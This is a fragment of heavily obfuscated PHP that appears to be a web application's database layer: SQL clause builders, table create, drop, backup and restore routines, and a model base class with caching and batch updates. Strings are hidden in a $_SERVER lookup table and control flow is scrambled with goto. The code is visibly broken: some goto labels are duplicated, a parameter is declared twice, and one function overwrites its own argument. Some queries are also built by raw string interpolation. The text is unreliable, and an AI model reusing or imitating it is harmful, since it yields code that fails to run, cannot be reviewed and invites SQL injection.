$A˖[] = $this->parseKey($Aȭ) . $Fڏ[950] . $this->parseValue($e߅); } $E⾸ƅ = implode($A箾, $A˖); break; } return $E⾸ƅ; } protected function parseLimit($b) { $F̳ =& $_SERVER[Ť]; return !empty($b) ? $F̳[48] . $b . $F̳[50] : $F̳[33]; } protected function parseJoin($f͇) { $c꫖ =& $_SERVER[Ť]; $bؑՄ = $c꫖[33]; if (!empty($f͇)) { if (is_array($f͇)) { foreach ($f͇ as $f̫򛓤 => $e) { if (!1 !== stripos($e, $c꫖[952])) { $bؑՄ .= $c꫖[50] . $e; } else { $bؑՄ .= $c꫖[953] . $e; } } } else { $bؑՄ .= $c꫖[953] . $f͇; } } $bؑՄ = preg_replace($c꫖[954], think_config($c꫖[860]) . $c꫖[955], $bؑՄ); return $bؑՄ; } protected function parseOrder($e٘) { $d =& $_SERVER[Ť]; if (is_array($e٘)) { $FɎ = array(); foreach ($e٘ as $bҿ => $eϊ) { if (is_numeric($bҿ)) { $FɎ[] = $this->parseKey($eϊ); } else { $eϊ = in_array(strtoupper(trim($eϊ)), array($d[956], $d[957])) ? $d[50] . $eϊ : $d[33]; if (preg_match($d[958], $bҿ)) { $FɎ[] = $this->parseKey($bҿ) . $eϊ; } else { think_exception($d[959] . $bҿ); } } } $e٘ = implode($d[47], $FɎ); } return !empty($e٘) ? $d[960] . $e٘ : $d[33]; } protected function parseGroup($E) { $Aխ =& $_SERVER[Ť]; return !empty($E) ? $Aխ[961] . $E : $Aխ[33]; } protected function parseHaving($a) { $a =& $_SERVER[Ť]; return !empty($a) ? $a[962] . $a : $a[33]; } protected function parseComment($C) { $eҗ =& $_SERVER[Ť]; return !empty($C) ? $eҗ[963] . $C . $eҗ[964] : $eҗ[33]; } protected function parseDistinct($b) { $C =& $_SERVER[Ť]; return !empty($b) ? $C[965] : $C[33]; } protected function parseUnion($B٣؏) { $E =& $_SERVER[Ť]; if (empty($B٣؏)) { return $E[33]; } if (isset($B٣؏[$E[342]])) { $Fа޺ = $E[966]; unset($B٣؏[$E[342]]); } else { $Fа޺ = $E[967]; } foreach ($B٣؏ as $Fڰ) { $d܄럣[] = $Fа޺ . (is_array($Fڰ) ? $this->buildSelectSql($Fڰ) : $Fڰ); } return implode($E[50], $d܄럣); } public function insert($E, $c = array(), $E = false) { goto D׵״; F鎨: $e .= $this->parseComment(!empty($c[$a⍋[348]]) ? $c[$a⍋[348]] : $a⍋[33]); return $this->execute($e, $this->parseBind(!empty($c[$a⍋[279]]) ? $c[$a⍋[279]] : array())); goto cފ; D׵״: $a⍋ =& $_SERVER[Ť]; $aɜ = $AӚ鷒 = array(); $this->model = $c[$a⍋[275]]; goto E; E: foreach ($E as $B؏ => $b䖖) { if (is_array($b䖖) && $a⍋[291] == $b䖖[0]) { $AӚ鷒[] = $this->parseKey($B؏); $aɜ[] = $b䖖[1]; } elseif (is_scalar($b䖖) || is_null($b䖖)) { $AӚ鷒[] = $this->parseKey($B؏); $aɜ[] = $this->parseValue($b䖖); } } $e = ($E ? $a⍋[838] : $a⍋[839]) . $a⍋[840] . $this->parseTable($c[$a⍋[273]]) . $a⍋[834] . implode($a⍋[47], $AӚ鷒) . $a⍋[835] . implode($a⍋[47], $aɜ) . $a⍋[836]; $e .= $this->parseLock(isset($c[$a⍋[790]]) ? $c[$a⍋[790]] : !1); goto F鎨; cފ: } public function selectInsert($b, $E륬, $E = array()) { goto e; e: $f㝉 =& $_SERVER[Ť]; $this->model = $E[$f㝉[275]]; if (is_string($b)) { $b = explode($f㝉[47], $b); } goto B; B: return $this->execute($F懟, $this->parseBind(!empty($E[$f㝉[279]]) ? $E[$f㝉[279]] : array())); goto f셤; B: array_walk($b, array($this, $f㝉[837])); $F懟 = $f㝉[968] . $this->parseTable($E륬) . $f㝉[834] . implode($f㝉[47], $b) . $f㝉[946]; $F懟 .= $this->buildSelectSql($E); goto B; f셤: } public function update($a, $Fĝ) { $Aۑ =& $_SERVER[Ť]; $this->model = $Fĝ[$Aۑ[275]]; $F뜺 = $Aۑ[969] . $this->parseTable($Fĝ[$Aۑ[273]]) . $this->parseSet($a) . $this->parseWhere(!empty($Fĝ[$Aۑ[269]]) ? $Fĝ[$Aۑ[269]] : $Aۑ[33]) . $this->parseOrder(!empty($Fĝ[$Aۑ[357]]) ? $Fĝ[$Aۑ[357]] : $Aۑ[33]) . $this->parseLimit(!empty($Fĝ[$Aۑ[286]]) ? $Fĝ[$Aۑ[286]] : $Aۑ[33]) . $this->parseLock(isset($Fĝ[$Aۑ[790]]) ? $Fĝ[$Aۑ[790]] : !1) . $this->parseComment(!empty($Fĝ[$Aۑ[348]]) ? $Fĝ[$Aۑ[348]] : $Aۑ[33]); return $this->execute($F뜺, $this->parseBind(!empty($Fĝ[$Aۑ[279]]) ? $Fĝ[$Aۑ[279]] : array())); } public function delete($A衃 = array()) { $c􏅋 =& $_SERVER[Ť]; $this->model = $A衃[$c􏅋[275]]; $DݺϽ = $c􏅋[970] . $this->parseTable($A衃[$c􏅋[273]]) . $this->parseWhere(!empty($A衃[$c􏅋[269]]) ? $A衃[$c􏅋[269]] : $c􏅋[33]) . $this->parseOrder(!empty($A衃[$c􏅋[357]]) ? $A衃[$c􏅋[357]] : $c􏅋[33]) . $this->parseLimit(!empty($A衃[$c􏅋[286]]) ? $A衃[$c􏅋[286]] : $c􏅋[33]) . $this->parseLock(isset($A衃[$c􏅋[790]]) ? $A衃[$c􏅋[790]] : !1) . $this->parseComment(!empty($A衃[$c􏅋[348]]) ? $A衃[$c􏅋[348]] : $c􏅋[33]); return $this->execute($DݺϽ, $this->parseBind(!empty($A衃[$c􏅋[279]]) ? $A衃[$c􏅋[279]] : array())); } public function select($b = array()) { goto F½; F½: $F =& $_SERVER[Ť]; $this->model = $b[$F[275]]; $C = $this->buildSelectSql($b); goto CȎ; EѤݸ: if ($B && !1 !== $A吗׍) { think_cache($BҒ, $A吗׍, $B); } return $A吗׍; goto eģ; CȎ: $B = isset($b[$F[343]]) ? $b[$F[343]] : !1; if ($B) { $BҒ = is_string($B[$F[89]]) ? $B[$F[89]] : $F[971] . md5($C); $d = think_cache($BҒ, $F[33], $B); if (!1 !== $d) { return $d; } } $A吗׍ = $this->query($C, $this->parseBind(!empty($b[$F[279]]) ? $b[$F[279]] : array())); goto EѤݸ; eģ: } public function buildSelectSql($D = array()) { goto d; b򟫭: return $bɬ; goto d; F: $bɬ = $this->parseSql($this->selectSql, $D); $bɬ .= $this->parseLock(isset($D[$d[790]]) ? $D[$d[790]] : !1); if (isset($DŠړ)) { think_cache($DŠړ, $bɬ); } goto b򟫭; d: $d =& $_SERVER[Ť]; if (isset($D[$d[347]])) { if (strpos($D[$d[347]], $d[47])) { list($Bֈ, $bƅϪ) = explode($d[47], $D[$d[347]]); } else { $Bֈ = $D[$d[347]]; } $Bֈ = $Bֈ ? $Bֈ : 1; $bƅϪ = isset($bƅϪ) ? $bƅϪ : (is_numeric($D[$d[286]]) ? $D[$d[286]] : 20); $Dꑖ = $bƅϪ * ((int) $Bֈ - 1); $D[$d[286]] = $Dꑖ . $d[47] . $bƅϪ; } if (think_config($d[972])) { $DŠړ = $d[973] . md5(serialize($D)); $b׉ٛ = think_cache($DŠړ); if ($b׉ٛ) { return $b׉ٛ; } } goto F; d: } public function parseSql($F, $Dǿϭɾ = array()) { $b =& $_SERVER[Ť]; $F = str_replace(array($b[974], $b[975], $b[976], $b[977], $b[978], $b[979], $b[980], $b[981], $b[982], $b[983], $b[984]), array($this->parseTable("{$Dǿϭɾ[$b[273]]}"), $this->parseDistinct(isset($Dǿϭɾ[$b[985]]) ? $Dǿϭɾ[$b[985]] : !1), $this->parseField(!empty($Dǿϭɾ[$b[267]]) ? $Dǿϭɾ[$b[267]] : $b[180]), $this->parseJoin(!empty($Dǿϭɾ[$b[276]]) ? $Dǿϭɾ[$b[276]] : $b[33]), $this->parseWhere(!empty($Dǿϭɾ[$b[269]]) ? $Dǿϭɾ[$b[269]] : $b[33]), $this->parseGroup(!empty($Dǿϭɾ[$b[986]]) ? $Dǿϭɾ[$b[986]] : $b[33]), $this->parseHaving(!empty($Dǿϭɾ[$b[987]]) ? $Dǿϭɾ[$b[987]] : $b[33]), $this->parseOrder(!empty($Dǿϭɾ[$b[357]]) ? $Dǿϭɾ[$b[357]] : $b[33]), $this->parseLimit(!empty($Dǿϭɾ[$b[286]]) ? $Dǿϭɾ[$b[286]] : $b[33]), $this->parseUnion(!empty($Dǿϭɾ[$b[341]]) ? $Dǿϭɾ[$b[341]] : $b[33]), $this->parseComment(!empty($Dǿϭɾ[$b[348]]) ? $Dǿϭɾ[$b[348]] : $b[33])), $F); return $F; } public function getLastSql($dΖ = '') { return $dΖ ? $this->modelSql[$dΖ] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($E) { return addslashes($E); } public function setModel($E鸡) { $this->model = $E鸡; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($Bڂ, $D쮈 = '') { $this->database = $Bڂ; $this->type = $D쮈; } public function model($e = '') { return new ModelBase($e, $_SERVER[Ť][33], $this->database); } public function db($Bّ = false) { goto D; D: $aŅ =& $_SERVER[Ť]; $d = array_change_key_case($this->database); if ($this->type == $aŅ[9] || !$Bّ) { return $this->model()->db(); } goto Aۙ释; Aۙ释: $f = $d[$aŅ[900]]; $d[$aŅ[900]] = $aŅ[33]; if ($d[$aŅ[739]] == $aŅ[740]) { $dߨʞ = $d[$aŅ[741]]; $d[$aŅ[741]] = substr($dߨʞ, 0, strrpos($dߨʞ, $aŅ[988])); } goto fƗ; F: if (!$cǡ) { $bײ->execute("\143\x72\x65\141\164\x65\40\x64\141\164\141\142\x61\x73\145\40\140{$f}\140"); } $d[$aŅ[900]] = $f; if ($d[$aŅ[739]] == $aŅ[740]) { $d[$aŅ[741]] .= $aŅ[988] . $f; } goto Aҝ; Aҝ: $this->database = $d; $bײ->execute("\x75\x73\x65\40\140{$f}\140"); return $bײ; goto c; fƗ: $this->database = $d; $bײ = $this->model()->db(); try { $cǡ = $bײ->execute("\163\150\x6f\x77\x20\x64\x61\x74\141\x62\141\163\x65\163\40\x6c\151\x6b\x65\x20\x27{$f}\47"); } catch (Exception $cڍ֛) { } goto F; c: } public function createTable($b՘, $Fσ߄ = null) { $C꜒ =& $_SERVER[Ť]; if (!IO::exist($b՘)) { ActionCall($C꜒[989], !0, 0); show_json(LNG($C꜒[990]), !1); } $Eܤ = sqlSplit(IO::getContent($b՘)); foreach ($Eܤ as $D֤) { if ($Fσ߄) { $A婭Ҳ = stripos($D֤, $C꜒[991]) === 0; if ($A婭Ҳ) { $Fσ߄->task[$C꜒[992]] += 1; } } $this->model()->db()->execute($D֤); if ($Fσ߄ && $A婭Ҳ) { preg_match($C꜒[993], $D֤, $Dܐڂ); $Fσ߄->task[$C꜒[994]] = $Dܐڂ[1]; $Fσ߄->update(1); } } $this->taskToCache($Fσ߄); } public function insertTable($FѴ, $A = null) { $F =& $_SERVER[Ť]; $CД = $this->model()->db(); $D춑 = $b ? array($b) : $CД->getTables(); foreach ($FѴ as $aӽ땶) { $b = basename($aӽ땶, $F[734]); if (!in_array($b, $D춑)) { continue; } if ($A) { $A->task[$F[994]] = $b; } if (get_filesize($aӽ땶) == 0) { continue; } $b݃ = $this->sqlToDb($aӽ땶, $A); if (!$b݃) { ActionCall($F[989], !0, 0); show_json(LNG($F[995]) . "\133{$b}\x5d", !1); } } $this->taskToCache($A); } public function sqlFromDb($E, $eԃ, $Dˌ = null, $f = null) { goto d; a봣: $b؝ړ = $EĔꟌ->getPk(); $cϝ = $EĔꟌ->getDbFields(); do { $C = $EĔꟌ->field($cϝ)->order($b؝ړ . $_SERVER[Ť][997])->selectPage($bևݵ, $b󼿉); $DՇ = isset($C[$_SERVER[Ť][358]][$_SERVER[Ť][360]]) ? $C[$_SERVER[Ť][358]][$_SERVER[Ť][360]] : 0; $fͬ = !empty($C[$_SERVER[Ť][361]]) ? $C[$_SERVER[Ť][361]] : array(); if (!($D㩾 = count($fͬ))) { break; } $cՉ = array(); foreach ($fͬ as $b) { if ($E == $_SERVER[Ť][998] && $b[$_SERVER[Ť][29]] == $_SERVER[Ť][999]) { $B֘ = json_decode($b[$_SERVER[Ť][366]], !0); if ($B֘[$_SERVER[Ť][28]] == date($_SERVER[Ť][700]) && !$B֘[$_SERVER[Ť][699]]) { continue; } } if ($f) { $b[$_SERVER[Ť][75]] = "\x7b\x69\x6f\x3a{$f}\x7d" . substr($b[$_SERVER[Ť][75]], strlen("\173\151\157\72{$b[$_SERVER[Ť][760]]}\175")); $b[$_SERVER[Ť][760]] = $f; } $cՉ[] = $_SERVER[Ť][1000] . $this->sqlEncode($b) . $_SERVER[Ť][1001]; } $b = "\111\116\x53\105\122\124\x20\111\x4e\124\117\40\140{$E}\140\40\50\x60" . implode($_SERVER[Ť][1002], $cϝ) . $_SERVER[Ť][1003]; fwrite($A, $b . implode($_SERVER[Ť][1004], $cՉ) . $_SERVER[Ť][67] . PHP_EOL); $b󼿉++; $D += $D㩾; if ($Dˌ) { $Dˌ->update($D㩾); } } while ($b󼿉 <= $DՇ); goto B׵ŷ; d: if ($Dˌ) { $Dˌ->task[$_SERVER[Ť][994]] = $E; } $EĔꟌ = $this->model($E); $D = 0; goto B퇨; B׵ŷ: fclose($A); return $D; goto E; B퇨: $b󼿉 = 1; $bևݵ = 500; $A = fopen($eԃ, $_SERVER[Ť][996]); goto a봣; E: } public function sqlToDb($Eʍ, $CŎ圞 = null) { goto cƏ; b: if (!$e) { return !1; } $eȢ = 0; $eٗ = $E¦[33]; goto Cτ; Cτ: $a = 500 + 1; while (!feof($e)) { if ($CŎ圞 && $eȢ != 0) { $CŎ圞->task[$E¦[992]] += 1; } $eȢ++; $dŦԮ = trim(fgets($e)); $eٗ .= $E¦[50] . $this->sqlDecode($dŦԮ, $this->type); if ($eȢ == $a) { $eٗ = rtrim(trim($eٗ), $E¦[67]); if (!$A->execute($eٗ)) { return !1; } if ($CŎ圞) { $CŎ圞->update($eȢ - 1); } $eٗ = $E¦[33]; $eȢ = 0; } } fclose($e); goto fۇ; cƏ: $E¦ =& $_SERVER[Ť]; $A = $this->model()->db(); $e = @fopen($Eʍ, $E¦[1005]); goto b; fۇ: if (trim($eٗ)) { $eٗ = rtrim(trim($eٗ), $E¦[67]); if (!$A->execute($eٗ)) { return !1; } if ($CŎ圞) { $CŎ圞->update($eȢ - 1); } } return !0; goto E; E: } public function dropTable($d͎ = null) { $CŽ = $this->model()->db(); $e焉 = $d͎ ? array($d͎) : $CŽ->getTables(); if (!$e焉) { return; } foreach ($e焉 as $d͎) { $CŽ->execute("\x64\162\x6f\160\x20\164\141\142\x6c\145\40\x69\146\40\x65\x78\x69\163\164\x73\x20\140{$d͎}\140"); } } private function taskToCache($D = null) { $dа =& $_SERVER[Ť]; if (!$D) { return; } $F = array($dа[994] => $D->task[$dа[994]], $dа[992] => $D->task[$dа[992]], $dа[1006] => $D->task[$dа[1006]]); if ($F[$dа[992]] == $F[$dа[1006]]) { $F[$dа[706]] = 1; } Cache::set($dа[1007] . $D->task[$dа[383]], $F); $D->end(); } private function sqlEncode($A֎) { $aɩ =& $_SERVER[Ť]; $EÈ = array(); foreach ($A֎ as $F) { if (is_array($F)) { $F = json_encode_force($F); } $F = addslashes($F); $F = str_replace(array($aɩ[1008], $aɩ[225]), array($aɩ[1009], $aɩ[1010]), $F); $EÈ[] = str_replace($aɩ[55], $aɩ[1011], $F); } return $aɩ[55] . implode($aɩ[1012], $EÈ) . $aɩ[55]; } private function sqlDecode($c٥, $Cݵ) { $A =& $_SERVER[Ť]; $c٥ = str_replace(array($A[1009], $A[1010]), array($A[1008], $A[225]), $c٥); if ($Cݵ == $A[9]) { $c٥ = stripslashes($c٥); } return $c٥; } } goto f; F: class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\157\x64\x69\x66\171\124\x69\x6d\145", "\x74\x69\155\x65", "\x69\x6e\163\145\162\164\54\x75\x70\144\x61\x74\x65", "\146\x75\156\x63\164\x69\157\x6e"), array("\x63\162\145\141\x74\x65\x54\151\155\145", "\164\151\155\145", "\151\x6e\x73\x65\x72\164", "\x66\x75\156\x63\x74\x69\x6f\156")); public function setDataAuto($D) { $this->dataAuto = $D; } public function __construct($A޴ = '', $cԩ = '', $cɮ = '') { parent::__construct($A޴, $cԩ, $cɮ); } public static function textEncode($fݻυ) { if (!$fݻυ) { return $fݻυ; } $B = json_encode($fݻυ); $B = preg_replace_callback($_SERVER[Ť][349], function ($dϟ) { return addslashes($dϟ[0]); }, $B); return json_decode($B); } public static function textDecode($dʯ) { $Cꅈ =& $_SERVER[Ť]; $Bѿ̣ = json_encode($dʯ); $Bѿ̣ = preg_replace_callback($Cꅈ[350], function ($Dٙ) { return $_SERVER[Ť][93]; }, $Bѿ̣); return json_decode($Bѿ̣); } protected $tableMeta = array(); protected function _beforeInsert(&$A䑠ʽ, $fĉ) { $Dܬí =& $_SERVER[Ť]; if (!$this->checkDataAutoHas($Dܬí[351])) { return; } $this->dataBeforeFilter($A䑠ʽ, $Dܬí[351]); } protected function _beforeUpdate(&$Aӄ, $DÐŃ) { $Aț =& $_SERVER[Ť]; if (!$this->checkDataAutoHas($Aț[352])) { return; } $this->dataBeforeFilter($Aӄ, $Aț[352]); } protected function _afterSelect(&$c, $fď) { if (!is_array($c)) { return; } if (!$this->checkDataAutoHas($_SERVER[Ť][353])) { return; } foreach ($c as &$A◯) { $this->dataAfterFilter($A◯); } unset($A◯); } protected function _afterFind(&$D, $dˢ) { if (!is_array($D)) { return; } if (!$this->checkDataAutoHas($_SERVER[Ť][353])) { return; } $this->dataAfterFilter($D); } public function setAutoIncrement($aȎ) { $DޢȒ = array($this->getPk() => $aȎ); $cϷ = $this->data($DޢȒ)->add(); if ($cϷ) { $this->delete($cϷ); } } public function getAutoIncrement() { $F = $this->getTableName(); $Cʹ = $this->max($this->getPk()); $D߈ = $this->query("\163\150\157\x77\40\164\x61\142\154\x65\40\x73\164\x61\164\x75\x73\40\x77\150\145\x72\145\40\116\141\155\145\x3d\x27{$F}\x27"); $b = $D߈[0][$_SERVER[Ť][354]]; $dߔ = max($Cʹ, $b); return $dߔ; } protected function _callBefore($B, $Eƭ) { return $this->cacheCallCheck($B, $Eƭ, !1); } protected function _callAfter($b, $b) { return $this->cacheCallCheck($b, $b, !0); } protected function cacheFunctionAlias($C闚) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($Fۏܻ, $E톶, $b = false) { $Eߌț = $this->cacheFunctionAlias($E톶); if (!$Eߌț) { return; } foreach ($Eߌț as $e => $Bһ) { $Dޘ = $Bһ[0]; $cܘ = explode($_SERVER[Ť][47], $Bһ[1]); if ($Fۏܻ == $e) { return $this->cacheFunctionGet($e, $Dޘ); } if ($b && in_array($Fۏܻ, $cܘ)) { $this->cacheFunctionClear($e, $Dޘ); } } } public function cacheFunctionGet($d, $dЙ) { $bꔦ۷ = $this->cacheKeyMake($d, $dЙ); $cė่ = Cache::get($bꔦ۷); if (!is_array($cė่)) { $cė่ = call_user_func_array(array($this, $d), array($dЙ, !0)); Cache::set($bꔦ۷, $cė่); } return $cė่; } public function cacheFunctionClear($B, $BŞ̻) { $cӠ = $BŞ̻; if (!is_array($BŞ̻)) { $cӠ = array($BŞ̻); } foreach ($cӠ as $fۆ) { $a = $this->cacheKeyMake($B, $fۆ); Cache::remove($a); } } private function cacheKeyMake($aϏ, $D열) { $F =& $_SERVER[Ť]; return get_class($this) . $F[70] . $aϏ . $F[355] . $D열; } protected function selectPage($Cᷢ = 200, $AÒ = 1) { goto eҾ; B: $E̸ِ = intval($this->count()); $Cᷢ = intval($Cᷢ); $Cᷢ = $Cᷢ <= 5 ? 5 : ($Cᷢ >= $Dկ ? $Dկ : $Cᷢ); goto dх; fʸ: $D۽܅ = $a򅍟; $D۽܅[$CͰ¾[357]] = array(); $this->optionsValue($D۽܅); goto B; a拍: $this->optionsValue($a򅍟); $DɣŬ = $this->page($AÒ, $Cᷢ)->select(); $DɣŬ = is_array($DɣŬ) ? $DɣŬ : array(); goto eӐ; eӐ: if ($bҠ¹ == 1) { $E̸ِ = count($DɣŬ); } $C = array($CͰ¾[358] => array($CͰ¾[359] => $E̸ِ, $CͰ¾[356] => $Cᷢ, $CͰ¾[347] => $AÒ, $CͰ¾[360] => $bҠ¹), $CͰ¾[361] => $DɣŬ ? $DɣŬ : array()); return $C; goto FꥄԴ; a: $Dկ = 4000; $Cᷢ = isset($in[$CͰ¾[356]]) ? $in[$CͰ¾[356]] : $Cᷢ; if ($Cᷢ === -1) { unset($in[$CͰ¾[356]]); $Dկ = 100000000; $Cᷢ = $Dկ; } goto fʸ; dх: $bҠ¹ = ceil($E̸ِ / $Cᷢ); $AÒ = intval(isset($in[$CͰ¾[347]]) ? $in[$CͰ¾[347]] : $AÒ); $AÒ = $AÒ <= 1 ? 1 : ($AÒ >= $bҠ¹ ? $bҠ¹ : $AÒ); goto a拍; eҾ: $CͰ¾ =& $_SERVER[Ť]; global $in; $a򅍟 = $this->optionsValue(); goto a; FꥄԴ: } protected function checkLength($F׏, $cÂ = 0, $A͡ = '') { $D޴ =& $_SERVER[Ť]; $cÂ = $cÂ ? $cÂ : 65536; if (!$F׏ || strlen($F׏) < $cÂ) { return; } $A͡ = $A͡ ? $A͡ . $D޴[67] : $D޴[33]; show_json($A͡ . LNG($D޴[362]) . "\x28{$cÂ}\x29", !1); } protected function metaSet($a╊, $Eœʯ = null, $e죣ه = null) { goto AۃЪ; AۃЪ: $b鏑 =& $_SERVER[Ť]; if (!$this->tableMeta || !$a╊) { return !1; } $C͇Ղ = $this->tableMeta[$b鏑[363]]; goto D; D: $a = $this->tableMeta[$b鏑[364]]; $b = Model($a); $B򄼻ʏ = array($C͇Ղ => $a╊, $b鏑[365] => $Eœʯ); goto c; c: if (is_null($Eœʯ)) { return $b->where(array($C͇Ղ => $a╊))->delete(); } if (is_null($e죣ه) && is_string($Eœʯ)) { return $b->where($B򄼻ʏ)->delete(); } $bފ = is_array($Eœʯ) ? $Eœʯ : array(); goto D셇ʋ; D셇ʋ: if (is_string($Eœʯ)) { $bފ[$Eœʯ] = $e죣ه; } $eϚ = array(); foreach ($bފ as $e幍 => $d) { $this->checkLength($d, !1, $a . $b鏑[4] . $e幍); $eϚ[] = array($C͇Ղ => $a╊, $b鏑[89] => $e幍, $b鏑[366] => $d); } goto C曈; C曈: $b->where(array($C͇Ղ => $a╊))->addAll($eϚ, array(), !0); return !0; goto d狶Յ; d狶Յ: } public function metaGet($c槊, $Bʽ = false) { goto EÊ; d: $B҈ڂ = Model($this->tableMeta[$a׾[364]]); if ($Bʽ) { $a֤ = array($A => $c槊, $a׾[89] => $Bʽ); return $B҈ڂ->where($a֤)->getField($a׾[366]); } $a֤ = array($A => $c槊); goto Eވǆ; EÊ: $a׾ =& $_SERVER[Ť]; if (!$this->tableMeta) { return array(); } $A = $this->tableMeta[$a׾[363]]; goto d; Eވǆ: $bɯ = $B҈ڂ->field($a׾[367])->where($a֤)->select(); $bɯ = array_to_keyvalue($bɯ, $a׾[89], $a׾[366]); return $bɯ; goto C; C: } private function checkDataAutoHas($aǤ) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $d؛) { if (in_array($aǤ, explode($_SERVER[Ť][47], $d؛[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$E闛, $FӲ) { $b霻 =& $_SERVER[Ť]; foreach ($this->dataAuto as $dӯպ) { $ḑҋ = $dӯպ[0]; if (!in_array($FӲ, explode($b霻[47], $dӯպ[2]))) { continue; } switch (trim($dӯպ[3])) { case $b霻[315]: case $b霻[316]: $Cš = $dӯպ[1]; $B = isset($dӯպ[4]) ? (array) $dӯպ[4] : array(); if ($Cš == $b霻[193] && array_key_exists($ḑҋ, $E闛)) { if (!$E闛[$ḑҋ]) { unset($E闛[$ḑҋ]); } break; } if (isset($E闛[$ḑҋ])) { array_unshift($B, $E闛[$ḑҋ]); } if ($b霻[315] == $dӯպ[3]) { $E闛[$ḑҋ] = call_user_func_array($Cš, $B); } else { $E闛[$ḑҋ] = call_user_func_array(array(&$this, $Cš), $B); } break; case $b霻[267]: $E闛[$ḑҋ] = $E闛[$dӯպ[1]]; break; case $b霻[288]: if (isset($E闛[$ḑҋ]) && !is_string($E闛[$ḑҋ])) { $E闛[$ḑҋ] = json_encode_force($E闛[$ḑҋ]); } break; case $b霻[317]: if ($E闛[$ḑҋ] === $b霻[33]) { unset($E闛[$ḑҋ]); } break; case $b霻[318]: $E闛[$ḑҋ] = $dӯպ[1]; default: break; } } if ($FӲ == $b霻[351]) { $bٝģ = strtolower($this->db->getDbType()); if (strpos($bٝģ, $b霻[9]) !== 0) { return; } $BƱ = $this->field(!0)->fields; $Cх = $BƱ[$b霻[246]]; if (isset($BƱ[$b霻[245]])) { unset($Cх[$BƱ[$b霻[245]]]); } foreach ($Cх as $F̚ => $FӲ) { if (!isset($E闛[$F̚])) { $E闛[$F̚] = $b霻[33]; } } } } private function dataAfterFilter(&$b) { $D߼Ɍ =& $_SERVER[Ť]; foreach ($this->dataAuto as $CẂ) { $e銂䪔 = $CẂ[0]; if (!in_array($D߼Ɍ[353], explode($D߼Ɍ[47], $CẂ[2]))) { continue; } if (!isset($b[$e銂䪔])) { continue; } switch (trim($CẂ[3])) { case $D߼Ɍ[315]: case $D߼Ɍ[316]: $F = isset($CẂ[4]) ? (array) $CẂ[4] : array(); array_unshift($F, $b[$e銂䪔]); if ($D߼Ɍ[315] == $CẂ[3]) { $b[$e銂䪔] = call_user_func_array($CẂ[1], $F); } else { $b[$e銂䪔] = call_user_func_array(array(&$this, $CẂ[1]), $F); } break; case $D߼Ɍ[267]: $b[$e銂䪔] = $b[$CẂ[1]]; break; case $D߼Ɍ[288]: $Eդ΍ = $b[$e銂䪔]; $b[$e銂䪔] = json_decode($Eդ΍, !0); if (is_null($b[$e銂䪔])) { $b[$e銂䪔] = $Eդ΍; } break; case $D߼Ɍ[317]: if ($b[$e銂䪔] === $D߼Ɍ[33]) { unset($b[$e銂䪔]); } break; case $D߼Ɍ[318]: $b[$e銂䪔] = $CẂ[1]; default: break; } } } public function saveAll($C𥣡) { goto c; c: $eŐ܄ =& $_SERVER[Ť]; $Eߪɵޑ = $this->tablePrefix . $this->tableName; $Bꊂ = self::SQL_WHERE_IN_CHUNK; goto D; D: $C𥣡 = is_array($C𥣡) ? $C𥣡 : array(); $a܍ͮ = $eŐ܄[368]; $AǗ = 0; goto cޫң; d¶: $this->chunkEventSet(); goto DѶ; cޫң: $fѠߙ = array(); $BÍ = count($C𥣡); for ($aĖ = 0; $aĖ < $BÍ; $aĖ++) { $Aʩʏ = $C𥣡[$aĖ]; if (!is_array($Aʩʏ) || count($Aʩʏ) != 4) { continue; } $eֻ = "\x55\x50\104\101\124\105\40\140{$Eߪɵޑ}\x60\x20\123\105\x54\x20{$Aʩʏ[2]}\40\x3d\40\103\101\123\105\40{$Aʩʏ[0]}\40\12"; if ($AǗ == 0) { $a܍ͮ = $eֻ; } $fѠߙ[] = $eŐ܄[113] . $Aʩʏ[1] . $eŐ܄[113]; $AǗ++; $a܍ͮ .= "\40\x57\x48\x45\x4e\x20\47{$Aʩʏ[1]}\47\x20\124\x48\105\x4e\x20\x27{$Aʩʏ[3]}\47\x20\xa"; if ($AǗ == $Bꊂ || $aĖ == $BÍ - 1) { goto B; aِ: $fѠߙ = array(); goto A퉫; B: $F = implode($eŐ܄[47], $fѠߙ); $a܍ͮ .= "\40\x45\x4e\104\x20\x20\x57\110\105\x52\x45\40{$Aʩʏ[0]}\40\x49\116\40\50{$F}\51\x20"; $this->execute($a܍ͮ); goto aֱ; aֱ: $AǗ = 0; $a܍ͮ = $eֻ; $this->chunkEventCheck(count($fѠߙ)); goto aِ; A퉫: } } goto d¶; DѶ: } public function saveAllEach($f˝) { $eĂ =& $_SERVER[Ť]; $Aꝍ = $this->tablePrefix . $this->tableName; foreach ($f˝ as $c掱) { if (!is_array($c掱) || count($c掱) != 4) { continue; } $DǤ = $c掱[0] . $eĂ[369] . $c掱[1] . $eĂ[113]; $eƅ = $c掱[2] . $eĂ[369] . $c掱[3] . $eĂ[113]; $E = "\165\x70\144\141\x74\145\x20{$Aꝍ}\40\163\x65\x74\x20{$eƅ}\x20\167\x68\x65\162\x65\40{$DǤ}\73"; $this->execute($E); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($aխ = false, $aС = false) { $this->_chunkEvent = $aխ; $this->_chunkEventParam = $aС; } private function chunkEventCheck($f) { if (!$this->_chunkEvent) { return; } $dˬ׸ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $dˬ׸[$_SERVER[Ť][370]] = $f; Hook::trigger($this->_chunkEvent, $dˬ׸); } public function addAll($dი, $C = array(), $F̿ = false) { goto Aר; C: if (empty($dი)) { $this->error = think_lang($Fէ͞[265]); return !1; } $C = $this->_parseOptions($C); foreach ($dი as $a => $bՍޕ) { $dი[$a] = $this->_facade($bՍޕ); $this->_beforeInsert($dი[$a], $C); } goto Cς盲; Aר: $Fէ͞ =& $_SERVER[Ť]; ignore_timeout(); $BɄ = self::SQL_WHERE_IN_CHUNK; goto C; Cς盲: if (method_exists($this->db, $Fէ͞[266])) { for ($b = 0; $b < count($dი); $b += $BɄ) { $f侞 = array_slice($dი, $b, $BɄ); if (!is_array($f侞) || count($f侞) == 0) { break; } $b݅ = $this->db->insertAll($f侞, $C, $F̿); 